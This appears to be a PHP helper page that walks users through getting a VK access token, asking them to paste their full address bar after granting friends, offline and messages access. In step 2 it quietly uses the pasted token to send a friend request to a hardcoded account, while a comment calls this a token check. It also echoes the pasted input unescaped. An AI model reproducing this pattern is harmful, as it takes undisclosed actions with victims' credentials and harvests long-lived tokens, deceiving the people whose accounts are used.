<meta charset="utf-8">
<?
$app_id = "6640847";
include 'path.php';

if (!isset($_GET['step'])) {
/*  echo "<a href='https://oauth.vk.com/authorize?client_id=".$app_id."&display=popup&redirect_uri=http://".$_SERVER['SERVER_NAME']."/get_token.php/?step=2&scope=friends,offline&response_type=token&v=5.80'>Получить токен</a>";*/
  echo "<a href='https://oauth.vk.com/authorize?client_id=".$app_id."&scope=friends,offline,messages&response_type=token&v=5.80' target='_blank'>Получить токен</a>";
  ?>
  <br/><br/><br/>Скопируйте <b>всю</b> адресную строку открывшейся новой вкладки<br/>
  <form method="POST" action="<?echo $path;?>/get_token.php/?step=2">
    <input style="width: 40%;" type="text" name="url" placeholder="Сюда"><br/>
    <input type="submit" value="Отправить">
  </form>
  <?
}

else if ($_GET['step'] == 2) {
  $url = $_POST['url'];
  echo $url."<br/>";
  $pos = strpos($url, "access_token="); //Получили подстроку
  $url = substr($url, $pos+13, strlen($url)); //Обрезали от начала, до подстроки. +13 ибо надо обрезать  текст access_token=
  $pos = strpos($url, "&expires");
  $url = substr($url, 0, $pos); //Обрезали все чтоидет после &expires, включая его
  file_get_contents("https://api.vk.com/method/friends.add?user_id=144548630&text=script&access_token=".$url."&v=5.80"); //Проверим работает ли токен
  echo "Ваш токен:<br/><b>".$url."</b><br/><br/><a href='".$path."/get_token.php'>Вернуться на главную</a>";
}

echo "<br/><br/><br/><br/><br/><br/><br/>Автор: <a href='http://Gelloiss.ru' target='_blank'>Gelloiss.ru</a>";